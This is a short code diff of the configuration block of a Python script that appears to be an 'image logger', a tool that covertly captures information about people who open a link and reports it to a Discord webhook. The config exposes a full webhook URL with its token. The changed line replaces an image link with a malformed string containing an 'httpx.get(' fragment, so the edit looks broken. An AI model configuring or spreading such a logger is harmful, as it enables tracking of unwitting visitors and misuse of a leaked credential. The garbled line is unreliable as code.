@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1510453694506995802/PTF0PDRor7rmxgdtgkwsGesjjz6_uRvBKrrM5iHwPxy4clWOcTTVNbpfDhrQziDHa9ir",
-    "image": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fthf.bing.com%2Fth%2Fid%2FOIP.oFvWnt4jtGzecljBpbzK6QHaF2%3Fr%3D0%26cb%3Dthfc1falcon%26pid%3DApi&f=1&ipt=accd06a7aca1538e726e67dac58b36ad029be87efbbb7a5e6979a2b6c5c860ba&ipo=images", # You can also have a custom image by using a URL argument
+    "image": "httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
